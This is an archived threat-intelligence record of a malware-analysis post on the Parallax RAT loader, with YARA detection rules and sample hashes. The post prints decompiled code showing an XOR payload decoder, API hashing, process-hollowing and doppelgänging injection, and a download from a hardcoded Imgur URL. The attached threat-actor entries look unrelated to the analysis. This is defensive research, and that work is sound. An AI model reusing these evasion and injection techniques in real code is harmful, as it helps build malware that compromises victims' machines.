{
    "id": "d0a61ab6-252d-41ad-b7b9-4b644c1b334e",
    "created_at": "2023-01-12T15:06:01.746332Z",
    "updated_at": "2025-03-27T02:06:02.144247Z",
    "deleted_at": null,
    "sha1_hash": "6fa3862cde54ee9ffe84e3f1912de1ddff57e358",
    "title": "2020-02-27 - Let‚Äôs Learn- Inside Parallax RAT Malware- Process Hollowing Injection & Process Doppelg√§nging API Mix- Part I",
    "authors": "",
    "file_creation_date": "2022-05-28T04:42:22Z",
    "file_modification_date": "2022-05-28T04:42:22Z",
    "file_size": 789120,
    "plain_text": "# Let's Learn: Inside Parallax RAT Malware: Process Hollowing Injection & Process Doppelg√§nging API Mix: Part I\n\n**[vkremez.com/2020/02/lets-learn-inside-parallax-rat-malware.html](https://www.vkremez.com/2020/02/lets-learn-inside-parallax-rat-malware.html)**\n\n## Goal: Reverse engineer and analyze the loader portion related to the Parallax remote administration tool/Trojan (RAT) low-level injection and image decoder techniques. The original sample discovery belongs to @malwrhunterteam.\n\n 2020-02-13:üî•üÜïPossible #Parallax #RAT | #Signed\n Ûæì¨ 'RTI, OOO' #Sectigo\n Image‚è©\"Big Brother Is Watching You\"Ûæì¶|üìâLow Detection\n 1ÔøΩSophisticated Loader via Imgur Img Pixel\n 2ÔøΩAPI Hash Resolver\n h/t @malwrhunterteam MD5:66db24f5fb3f8fca3f33fb26ffc67adf\n Ref‚§µhttps://t.co/f50Tpa0wnW pic.twitter.com/S4MGGGCXZa ‚Äî Vitali Kremez (@VK_Intel) February 13, 2020\n\n Source: Parallax signed loader (SHA-256):\n 829fce14ac8b9ad293076c16a1750502c6b303123c9bd0fb17c1772330577d65 Parallax injected payload (SHA-256):\n 20d0be64a0e0c2e96729143d41b334603f5d3af3838a458b0627af390ae33fbc Outline:\n```\nI. Background & Executive Summary\nII. Parallax RAT: Loader Portion Flow\nA. Main Flow Decoder\nB. Dynamic Code Stack Execution \nC. Process Hollowing & Process Doppelg√§nging Mix with PEB Traversal\nIII. Parallax RAT: Payload Portion Flow\nA. Main Flow\nB. Image Decoder Technique\nIV. Yara Signature\nV. Addendum\nA. Loader API List Table Resolved\nB. Payload API List Table Resolved\nC. Malware Change Log\n\n I. Background & Executive Summary\n\n```\n\n-----\n\n## The Parallax remote administration tool/Trojan (RAT) emerged in 2019 on the underground community written in MASM programming language. The RAT certainly became notorious for its low static detection oftentimes observed with close to 0 detection as displayed on VirusTotal. The malware also uses signed digital certificates as well as part of the payload execution. The Parallax developers market the malware as RAT as follows:\n```\nParallax RAT had been developed by a professional team and its fully coded in MASM.\nIts created to be best in remote administration. \nParallax RAT will provide you all you need.\nSuitable for professionals and as well for beginners.\nFirst and most important we offer 99% reliability when it comes to stability.\nParallax was designed to give the user a real multithreaded performance, \nblazing fast speed and lightweight deployment to your computers with very little\nresource \nconsumption.\nWe are a group of developers and we are here to offer quality service.\n-Parallax Team, join now!\n\n The RAT malware binary builds a table with function addresses leveraging API process environmental block (PEB) CRC32 hashing algorithm with a parser for \"%x.png\" and \"cmd.exe.\" The malware authors boast runtime anti-virus bypasses which are achieved in part of its more signed loader coupled with Process Hollowing and Process Doppelg√§nging injection techniques. The goal of the injection is to impersonate legitimate system executables such as mstcs.exe and cmd.exd and avoid being filtered and detected by the anti-virus engines.\n\n```\n\n-----\n\n## One of the interesting possible anti-analysis code is the dynamic stack code allocation and parsing. Moreover, two additional features stand out when dealing with this malware as its low-level injection technique with the image additional decoded from the Imgur image as, for example, \"Big Brother Is Watching You\".\n\n The malware writes the layer named as \"%x.png\" to local %TEMP% directory. The name is generated via few rand and srand API calls formatted to hexadecimal string. II. Parallax RAT: Loader Portion Flow\n\n\n-----\n\n## A. Main Flow Overview The crypted signed loader decodes the layer using XOR and key '0x3BC01699' as well as the URL string to pass to the next layer. The layer is injected into the process setup within the loader itself.\n\n The main loop is as follows as pseudo-coded C++:\n\n\n-----\n\n```\n hModule GetModuleHandleA(ModuleName);\n v_alloc_ret = GetProcAddress(hModule, &ProcName);// VirtualAlloc\n v25 = ((int (__cdecl *)(int, signed int, signed int, int))v_alloc_ret)\n (v48, 41648, 4096, v28);\n decoder(v25, (int)&payload_blob, v44);    // payload_bin\n v29[v50 / 4] = v25;\n v29[v49 / 4] = v33;\n v29[v47 / 4] = v35;\n v29[v46 / 4] = v32;\n v24 = v36 + v25;\n v23 = (int (__cdecl *)(int **))(v36 + v25);\n decoder((int)v3, (int)&url_blob, v42);    // \"https://i.imgur.com/emshETT.png\"\n mstc = aMstsc_exe; // \"mstsc.exe\"\n v1 = v3;\n result = v23(&v1);\n if ( !v91 )\n  result = 1;\n return result;\n\n## The decoder function is as follows:\nint __cdecl decoder(int alloc_address, int enc_blob, int enc_lentgh)\n{\n int result; \n int i; \n int iter_cmp;\n result = 0;\n iter_cmp = 0;\n for ( i = 0; i < enc_lentgh; ++i )\n {\n  result = i;\n  *(_DWORD *)(alloc_address + 4 * i) = key[iter_cmp] ^ *(_DWORD *)(enc_blob + 4 *\ni);\n   //key '0x3BC01699'\n  if ( iter_cmp )\n   ++iter_cmp;\n  else\n   iter_cmp = 0;\n }\n return result;\n}\n\n B. Dynamic Code Stack Execution\n\n```\n\n-----\n\n## The malware complicates some analysis due to its stack dynamic call execution. Parallax also loads another ntdll DLL library into memory leveraging API calls and retrieve path via GetSystemDirectoryW. C. Process Hollowing & Process Doppelg√§nging Mix with PEB Traversal\n Parallax relies on native level (Nt/Zw) process hollowing injection technique.\n\n Launch process exe via CreateProcessW -> ZwAllocateVirtualMemory -> ZwGetContextThread -> ZwReadVirtualMemory -> GlobalAlloc -> RtlDecompressBuffer -> ZwAllocateVirtualMemory -> ZwWriteVirtualMemory -> Resolve API Table -> ZwAllocateVirtualMemory -> ZwAllocateVirtualMemory -> ZwProtectVirtualMemory -> ZwProtectVirtualMemory -> ZwProtectVirtualMemory -> ZwResumeThread -> ... -> ZwReadVirtualMemory\n\n\n-----\n\n## The malware also contains the usual Process Doppelg√§nging API calls such as follows as resolved via PEB traversal (to be explored further):\n\n ZwCreateTransaction RtlSetCurrentTransaction ZwCreateSection ZwMapViewOfSection ZwRollbackTransaction\n\n III. Parallax RAT: Payload Portion Flow A. Main Flow The malware payload runs ZwDelayExecution API and resolves API via PEB traversal technique relying on global memory allocations and preferring Zw*-prefix API calls. It has its unique unique file generation algorithm leveraging srand and rand API calls and obfuscating the file as \".png\" in %TEMP% directory.\n\n\n-----\n\n```\n v124 0;\n do\n {\n  while ( 1 )\n  {\n   ++v124;\n   v14 = 0xCBCBCBCB;\n   resolver = 0xCBCBCBCB;\n   zw_arg_func(vCBCBCBEF, 5000);\n   ++*(_DWORD *)(resolver + 72);\n   load_lib = 0;\n   *(_DWORD *)(resolver + 60) = api_hash_crc32(*(_DWORD *)(resolver + 56),\n3380355071);// GetProcAddress\n   *(_DWORD *)(resolver + 28) = api_hash_crc32(*(_DWORD *)(resolver + 56),\n3407153372);// LoadLibraryW\n   v50 = 'n';\n   v51 = 't';\n   v52 = 'd';\n   v53 = 'l';\n   v54 = 'l';\n   v55 = 0;\n   load_lib = (*(int (__stdcall **)(__int16 *))(resolver + 28))(&v50);//\nLoadLibraryW\n   *(_DWORD *)(resolver + 32) = api_hash_crc32(*(_DWORD *)(resolver + 56),\n2143056945);// GlobalAlloc\n   *(_DWORD *)(resolver + 48) = api_hash_crc32(*(_DWORD *)(resolver + 56),\n128164624);// GetTempPathW\n   *(_DWORD *)(resolver + 12) = api_hash_crc32(load_lib, 4099714205);//\nRtlCreateUnicodeStringFromAsciiz\n   *(_DWORD *)(resolver + 36) = api_hash_crc32(load_lib, 3603135000);//\nZwDelayExecution\n   *(_DWORD *)(resolver + 40) = api_hash_crc32(*(_DWORD *)(resolver + 56),\n3300174157);// GetFileAttributesW\n   *(_DWORD *)(resolver + 44) = api_hash_crc32(*(_DWORD *)(resolver + 56),\n1552247879);// CreateProcessW\n   global_free_ret = api_hash_crc32(*(_DWORD *)(resolver + 56), 1667964573);//\nGlobalFree\n   api_hash_crc32(*(_DWORD *)(resolver + 56), 3081981091);// GlobalReAlloc\n   zwterm_process = (void (__stdcall *)(signed int,\n_DWORD))api_hash_crc32(load_lib, 3798818906);// ZwTerminateProcess\n   if ( (signed int)v124 > 3 )\n    zwterm_process(-1, 0);\n   v56 = 'o';\n   v57 = 'l';\n   v58 = 'e';\n   v59 = '3';\n   v60 = '2';\n   v61 = 0;\n   *(_DWORD *)(resolver + 20) = api_hash_crc32(load_lib, 233258989);// swprintf\n   ole32_ret = (*(int (__stdcall **)(__int16 *))(resolver + 28))(&v56);\n   ==\n\n```\n\n-----\n\n```\n   createfilew_ret (int (__stdcall )(int, signed int, signed int, _DWORD, signed\nint, signed int, _DWORD))(*(int (__stdcall **)(_DWORD, char *))(resolver + 60))(*\n(_DWORD *)(resolver + 56), &v109);\n   *(_DWORD *)(resolver + 52) = api_hash_crc32(*(_DWORD *)(resolver + 56),\n3437843986);// WriteFile\n   CloseHandle_ret = (void (__stdcall *)(int))api_hash_crc32(*(_DWORD *)(resolver\n+ 56), 2962429428);// CloseHandle\n   gettickcount_ret = api_hash_crc32(*(_DWORD *)(resolver + 56), 1531058680);//\nGetTickCount\n   VirtualAlloc_ret = (int (__stdcall *)(_DWORD, signed int, signed int, signed\nint))api_hash_crc32(// VirtualAlloc\n*(_DWORD *)(resolver + 56),\n164498762);\n   rand_msvscrt_Resolve(1, 7, resolver);\n   rand_resolv = rand_msvscrt_Resolve(1, -1, resolver);\n   srand_msvcrt_resolve(rand_resolv, resolver);\n   shell_32Dll = sub_402090(0xC8A1BAD8);\n   if ( !shell_32Dll )\n   {\n    v35 = 's';\n    v36 = 'h';\n    v37 = 'e';\n    v38 = 'l';\n    v39 = 'l';\n    v40 = '3';\n    v41 = '2';\n    v42 = 0;\n    shell_32Dll = (*(int (__stdcall **)(__int16 *))(resolver + 28))(&v35);\n   }\n   SHGetFolderPathW_ret = (void (__stdcall *)(_DWORD, signed int, _DWORD, _DWORD,\nint))api_hash_crc32(// SHGetFolderPathW\nshell_32Dll,\n3345296191);\n   get_temp_path = (*(int (__stdcall **)(signed int, signed int))(resolver + 32))\n(64, 520);\n   (*(void (__stdcall **)(signed int, int))(resolver + 48))(260, get_temp_path);//\nGetTempPathW\n   v43 = '%';\n   v44 = 'x';\n   v45 = '.';\n   v46 = 'p';\n   v47 = 'n';\n   v48 = 'g';\n   v49 = 0;\n   globalAlloc = (*(int (__stdcall **)(signed int, signed int))(resolver + 32))\n(64, 100);\n   rand_msvscrt_Resolve(10000, 100000000, resolver);\n   (*(void (__cdecl **)(int, __int16 *, _DWORD))(resolver + 20))(globalAlloc,\n&v43, *(_DWORD *)(resolver + 72));// swprintf formatter\n   path_parser(get_temp_path, globalAlloc);\n   (*(void (__stdcall **)(char *, _DWORD))(resolver + 12))(&v4, *(_DWORD\n\n```\n\n-----\n\n```\n )resolver);// RtlCreateUnicodeStringFromAsciiz formatter\n   path_ret = path_check(get_temp_path);\n   if ( createinstance_path_create(\n       v5,\n       get_temp_path,\n       path_ret,\n       (int)&cocreateInstance_ret,\n       *(_DWORD *)(resolver + 36)) )\n   {\n    break;\n   }\n   file_open = 0;\n   temp_path_file_write = createfilew_ret(get_temp_path, 4, 3, 0, 2, 128, 0);\n   if ( temp_path_file_write != 0xFFFFFFFF )\n   {\n    file_open = wininet_dll_func(*(_DWORD *)resolver, temp_path_file_write,\nresolver);\n    CloseHandle_ret(temp_path_file_write);\n    break;\n   }\n  }\n  v72 = (*(int (__stdcall **)(int))(resolver + 40))(get_temp_path);\n }\n while ( v72 == 0xFFFFFFFF || v72 & 0x10 );\n v8 = 0x7610;\n v71 = 31012;\n v_alloc_ret = (_BYTE *)VirtualAlloc_ret(0, 31012, 4096, 64);\n func(v_alloc_ret, *(_BYTE **)(resolver + 4), v71);\n v26 = &v_alloc_ret[v8];\n v24 = (void (__cdecl *)(int, int *))&v_alloc_ret[v8];\n v25 = parser_lopp(get_temp_path);\n v69 = (*(int (__stdcall **)(signed int, int))(resolver + 32))(64, v25 + 2);\n for ( i = 0; *(_WORD *)(get_temp_path + 2 * i); ++i )\n  *(_BYTE *)(i + v69) = *(_BYTE *)(get_temp_path + 2 * i);\n v77 = 0;\n v24(v69, &v77);\n if ( v77 )\n {\n  v68 = v77;\n  v126 = v77;\n  *(_DWORD *)(v77 + 24) = v77 + 72;\n  v66 = parser_lopp2(*(_DWORD *)(v126 + 24));\n  v67 = (int *)(*(_DWORD *)(v126 + 24) + v66 + 1);\n  v64 = *v67;\n  v21 = v67 + 1;\n  v65 = (int *)(v66 + *(_DWORD *)(v126 + 24) + v64 + 5);\n  v76 = *v65;\n  v121 = v65 + 1;\n  v23 = (int *)((char *)v65 + v76 + 4);\n  v19 = *(int *)((char *)v65 + v76 + 4);\n  v17 = (void (__cdecl *)(_DWORD))(v65 + 14912);\n  v22 = (int *)((char *)v65 + v76 + 8);\n  *(_DWORD *)v126 = v22;\n  *(_DWORD *)(v126 + 8) = v21;\n  *(_DWORD *)(v126 + 12) = v64;\n\n```\n\n-----\n\n```\n  v27 c ;\n  v28 = 'm';\n  v29 = 'd';\n  v30 = '.';\n  v31 = 'e';\n  v32 = 'x';\n  v33 = 'e';\n  v34 = 0;\n  *(_DWORD *)(v126 + 28) = &v27;\n  *(_DWORD *)(v126 + 16) = 19340;\n  v63 = (*(int (__stdcall **)(signed int, signed int))(resolver + 32))(64, 520);\n  SHGetFolderPathW_ret(0, 7, 0, 0, v63);\n  *(_DWORD *)(v126 + 32) = v63;\n  *(_BYTE *)(v126 + 64) = 0;\n  *(_BYTE *)(v126 + 65) = 1;\n  *(_DWORD *)(v126 + 36) = v121;\n  *(_DWORD *)(v126 + 40) = 3996;\n  *(_DWORD *)(v126 + 4) = v19;\n  VirtualProtect_ret = (void (__stdcall *)(int *, int, signed int, char\n*))api_hash_crc32(\n                                        *\n(_DWORD *)(resolver + 56),\n268857135);// VirtualProtect\n  VirtualProtect_ret(v121, v76, 64, &v1);\n  v16 = v17;\n  v17(v126);\n }\n return ((int (__stdcall *)(unsigned int, _DWORD))zwterm_process)(0xFFFFFFFF, 0);\n\n## B. Image Decoder Technique The payload calls wininet.DLL library utilizing InternetOpenA, InternetOpenUrlA, InternetReadFile InternetReadFile API calls:\n\n```\n\n-----\n\n```\nint __cdecl wininet_dll_func(int a1, int a2, int resolver)\n{\n...\n LoadLibraryW_ret = 0;\n v4 = 'w';\n v5 = 'i';\n v6 = 'n';\n v7 = 'i';\n v8 = 'n';\n v9 = 'e';\n v10 = 't';\n v11 = 0;\n LoadLibraryW_ret = (*(int (__stdcall **)(__int16 *))(resolver + 28))(&v4);\n InternetGetConnectedState_ret = (int (__stdcall *)(_DWORD,\n_DWORD))api_hash_crc32(LoadLibraryW_ret, 4075158540);// InternetGetConnectedState\n InternetOpenA_ret = (int (__stdcall *)(_DWORD, signed int, _DWORD, signed int,\n_DWORD))api_hash_crc32(\nLoadLibraryW_ret,\n3658917949);// InternetOpenA\n InternetOpenUrlA_ret = (int (__stdcall *)(int, int, _DWORD, _DWORD, signed int,\n_DWORD))api_hash_crc32(\nLoadLibraryW_ret,\n23397856);// InternetOpenUrlA\n InternetReadFile_ret = (void (__stdcall *)(int, _BYTE *, signed int, int\n*))api_hash_crc32(\nLoadLibraryW_ret,\n1824561397);// InternetReadFile\n InternetCloseHandle_ret = (void (__stdcall *)(int))api_hash_crc32(LoadLibraryW_ret,\n3843628324);// InternetCloseHandle\n Sleep_ret = (void (__stdcall *)(signed int))api_hash_crc32(*(_DWORD *)(resolver +\n56), 3472027048);// Sleep\n while ( !InternetGetConnectedState_ret(0, 0) )\n  Sleep_ret(5000);\n iopen_url_ret = InternetOpenA_ret(0, 1, 0, 0x4000100, 0);\n if ( !iopen_url_ret )\n  iopen_url_ret = 0;\n v19 = 0;\n internetopen_url_ret = InternetOpenUrlA_ret(iopen_url_ret, a1, 0, 0, 2048, 0);\n GlobalAlloc_ret = (_BYTE *)(*(int (__stdcall **)(signed int, signed int))(resolver\n+ 32))(64, 2000);// GlobalAlloc\n if ( internetopen_url_ret )\n {\n  do\n  {\n   parse_x(GlobalAlloc_ret, 2000);\n   InternetReadFile_ret(internetopen_url_ret, GlobalAlloc_ret, 1024, &v23);\n   v19 += v23;\n\n```\n\n-----\n\n```\n   if ( v23 )\n    (*(void (__stdcall **)(int, _BYTE *, int, char *, _DWORD))(resolver + 52))\n(a2, GlobalAlloc_ret, v23, &v12, 0);// WriteFile\n  }\n  while ( v23 );\n  InternetCloseHandle_ret(internetopen_url_ret);\n }\n else\n {\n  InternetCloseHandle_ret(0);\n }\n return v19;\n\n## IV. Yara Signature A. Parallax Loader\nrule crime_win32_parallax_loader_1 {\n  meta:\n   description = \"Detects Parallax Loader\"\n   author = \"@VK_Intel\"\n   reference = \"https://twitter.com/VK_Intel/status/1227976106227224578\"\n   date = \"2020-02-24\"\n   hash1 = \"829fce14ac8b9ad293076c16a1750502c6b303123c9bd0fb17c1772330577d65\"\n  strings:\n   $main_call = { 68 81 85 50 00 e8 ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 8d ?? ?? ?? ?? ??\n51 ff ?? ?? ?? ?? ?? e8 ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 68 00 10 00\n00 68 b0 a2 00 00 ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? ff ?? ?? ??\n?? ?? 68 8c e1 4f 00 ff ?? ?? ?? ?? ?? e8 ?? ?? ?? ?? 83 c4 0c 8b ?? ?? ?? ?? ?? 8b\n?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 89 ?? ?? 8b ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 8b ??\n?? ?? ?? ?? 89 ?? ?? 8b ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 89 ?? ??\n8b ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 89 ?? ?? 8b ?? ?? ?? ?? ?? 03\n?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? ff ?? ?? ?? ??\n?? 68 40 84 50 00 8d ?? ?? ?? ?? ?? 51 e8 ?? ?? ?? ?? 83 c4 0c}\n   $decoder_call = { 55 8b ec 83 c4 f8 33 c0 89 ?? ?? 33 d2 89 ?? ?? 8b ?? ?? 3b ??\n?? 7d ?? 8b ?? ?? 8b ?? ?? 8b ?? ?? 8b ?? ?? 33 ?? ?? ?? ?? ?? ?? 8b ?? ?? 8b ?? ??\n89 ?? ?? 83 ?? ?? ?? 75 ?? 33 d2 89 ?? ?? eb ?? ff ?? ?? ff ?? ?? 8b ?? ?? 3b ?? ??\n7c ?? 59 59 5d c3}\n  condition:\n   uint16(0) == 0x5a4d and filesize < 2000KB and\n   2 of them\n}\n\n B. Parallax Payload\n\n```\n\n-----\n\n```\nrule crime_win32_parallax_payload_1 {\n  meta:\n   description = \"Detects Parallax Injected Payload v1.01\"\n   author = \"@VK_Intel\"\n   reference = \"https://twitter.com/VK_Intel/status/1227976106227224578\"\n   date = \"2020-02-24\"\n   hash1 = \"20d0be64a0e0c2e96729143d41b334603f5d3af3838a458b0627af390ae33fbc\"\n  strings:\n  $zwdelay_prologue = { 66 ?? ?? ?? 66 83 c1 01 66 ?? ?? ?? 50 b8 cb cb cb cb 89 ??\n?? ?? ?? ?? 58 8b ?? ?? ?? ?? ?? 89 ?? ?? 68 88 13 00 00 8b ?? ?? 8b ?? ?? 51 e8 ??\n?? ?? ??}\n  $wininet_call = { b8 77 00 00 00 66 ?? ?? ?? b9 69 00 00 00 66 ?? ?? ?? ba 6e 00\n00 00 66 ?? ?? ?? b8 69 00 00 00 66 ?? ?? ?? b9 6e 00 00 00 66 ?? ?? ?? ba 65 00 00\n00 66 ?? ?? ?? b8 74 00 00 00 66 ?? ?? ?? 33 c9 66 ?? ?? ?? 8d ?? ?? 52 8b ?? ?? 8b\n?? ?? ff d1 89 ?? ?? 6a 00 68 0c fc e5 f2 8b ?? ?? 52 e8 ?? ?? ?? ?? 83 c4 0c 89 ??\n?? 6a 00 68 3d a8 16 da 8b ?? ?? 50 e8 ?? ?? ?? ?? 83 c4 0c 89 ?? ?? 6a 00 68 e0 05\n65 01 8b ?? ?? 51 e8 ?? ?? ?? ?? 83 c4 0c 89 ?? ?? 6a 00 68 f5 98 c0 6c 8b ?? ?? 52\ne8 ?? ?? ?? ?? 83 c4 0c 89 ?? ?? 6a 00 68 24 1d 19 e5 8b ?? ?? 50 e8 ?? ?? ?? ?? 83\nc4 0c 89 ?? ?? 6a 00 68 a8 ed f2 ce 8b ?? ?? 8b ?? ?? 52 e8 ?? ?? ?? ?? 83 c4 0c 89\n?? ?? 6a 00 6a 00 ff ?? ?? 85 c0 75 ?? 68 88 13 00 00 ff ?? ?? eb ?? 6a 00 68 00 01\n00 04 6a }\n  $rand_png_call = { b8 25 00 00 00 66 ?? ?? ?? ?? ?? ?? b9 78 00 00 00 66 ?? ?? ??\n?? ?? ?? ba 2e 00 00 00 66 ?? ?? ?? ?? ?? ?? b8 70 00 00 00 66 ?? ?? ?? ?? ?? ?? b9\n6e 00 00 00 66 ?? ?? ?? ?? ?? ?? ba 67 00 00 00 66 ?? ?? ?? ?? ?? ?? 33 c0 66 ?? ??\n?? ?? ?? ?? 6a 64 6a 40 8b ?? ?? 8b ?? ?? ff d2 89 ?? ?? 8b ?? ?? 50 68 00 e1 f5 05\n68 10 27 00 00 e8 ?? ?? ?? ??}\n  condition:\n   uint16(0) == 0x5a4d and filesize < 100KB and\n   2 of them\n}\n\n## V. Addendum A. Loader API List Table Resolved\n\n```\n\n-----\n\n```\nGetSystemDirectoryW\nGlobalAlloc\nZwAllocateVirtualMemory\nIsWow64Process\nDbgPrint\nZwReadVirtualMemory\nZwProtectVirtualMemory\nRtlGetNativeSystemInformation\nRtlWow64EnableFsRedirectionEx\nGetSystemDirectoryW\nlstrcmpiW\nZwWriteVirtualMemory\nZwQueryInformationProcess\nLoadLibraryW\nZwCreateFile\nZwCreateTransaction\nZwWriteFile\nRtlSetCurrentTransaction\nZwCreateSection\nZwMapViewOfSection\nZwRollbackTransaction\nZwGetContextThread\nZwResumeThread\nZwClose\nZwUnmapViewOfSection\nZwTerminateProcess\nZwDelayExecution\nNtQueryInformationFile\nRtlDosPathNameToNtPathName_U\nNtQuerySystemInformation\nswprintf\nZwSetContextThread\nCreateProcessW\nLdrGetProcedureAddress\nRtlCreateUnicodeStringFromAsciiz\nZwReadFile\nCopyFileW\nlstrlenW\nGetWindowsDirectoryW\nGetFileAttributesW\nCreateRemoteThread\nFindFirstFileW\nFindNextFileW\nCreateFileW\nWaitForSingleObject\nZwFlushInstructionCache\nRtlDecompressBuffer\nReadFile\nWriteFile\nGetFileSize\n\n## B. Payload API List Table Resolved\n\n```\n\n-----\n\n```\nGetProcAddress\nLoadLibraryW\nGlobalAlloc\nGetTempPathW\nRtlCreateUnicodeStringFromAsciiz\nZwDelayExecution\nGetFileAttributesW\nCreateProcessW\nGlobalFree\nGlobalReAlloc\nZwTerminateProcess\nswprintf\nWriteFile\nCloseHandle\nGetTickCount\nVirtualAlloc\nSHGetFolderPathW\nswprintf\nRtlCreateUnicodeStringFromAsciiz\nVirtualProtect\nCoInitialize\nCoCreateInstance\nCreateFileW\nrand\nsrand\nInternetGetConnectedState\nInternetOpenA\nInternetOpenUrlA\nInternetReadFile\nInternetCloseHandle\nSleep\n\n## C. Malware Change Log\n\n```\n\n-----\n\n```\n1.0.3\n- Password recovery bug fixed if multiple users were selected.\n- Fixed memory leak on Server.exe Remote desktop.\n- Fixed labels background color on Builder -> Connections.\n- Fixed UPX bug where it does not compress on some OS.\n- AutoTasks now auto Save/Load settings.\n- HWID keeps changing on special OS's bug fixed.\n- It is now possible to use 0.1 intervals for the Remote View. Though not\nrecommended.\n- Statusbar now shows which ports are in listening status. The maximum display is 10\nports.\n- Password recovery now shows the total passwords of all clients.\n- Builder -> Installation file name now no needs \".exe\" file extension.\n- Mutex name now randomized if no profile is found.\n[+] Added Exception handler window. Not all functions have an Exception handler yet.\n1.0.2\n- Password recovery bug fixed if multiple users were selected*.\n- Fixed Mozilla Thunderbird bug where it gets stuck if recovered more than once.\n(Server has to be updated)\n- The serial has changed. The case where it changes if VPN is on is not a bug but it\nshould not change anymore.\n*The password recovery concurrency is hardcoded to 5 clients. This value cannot be\nchanged at the moment.\nThe rest clients will be queued to be completed at another time once the current\nconcurrency value drops below the maximum.\nPlease note that this software at its early stages. So don't freak out if you find\nsomething that doesn't work as expected.\nMost bugs happen because the coder did not test the same settings/environment as you\ndid. You should report any bugs/issues to be fixed.\nYou need to be more specific about what you exactly faced. Things like \"it crashes\"\ndoes not help track down the issue.\n1.0.1\n- Password recovery update to support Mozilla Thunderbird.\n- Fixed few bugs on the server receives.\n- Bug fixed if the Password profile folder does not exist.\n1.0.0\n- Initial release.\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-02-27 - Let‚Äôs Learn- Inside Parallax RAT Malware- Process Hollowing Injection & Process Doppelg√§nging API Mix- Part I.pdf"
    ],
    "report_names": [
        "2020-02-27 - Let‚Äôs Learn- Inside Parallax RAT Malware- Process Hollowing Injection & Process Doppelg√§nging API Mix- Part I.pdf"
    ],
    "threat_actors": [
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535961,
    "ts_updated_at": 1743041162,
    "ts_creation_date": 1653712942,
    "ts_modification_date": 1653712942,
    "files": {
        "pdf": "https://archive.orkl.eu/6fa3862cde54ee9ffe84e3f1912de1ddff57e358.pdf",
        "text": "https://archive.orkl.eu/6fa3862cde54ee9ffe84e3f1912de1ddff57e358.txt",
        "img": "https://archive.orkl.eu/6fa3862cde54ee9ffe84e3f1912de1ddff57e358.jpg"
    }
}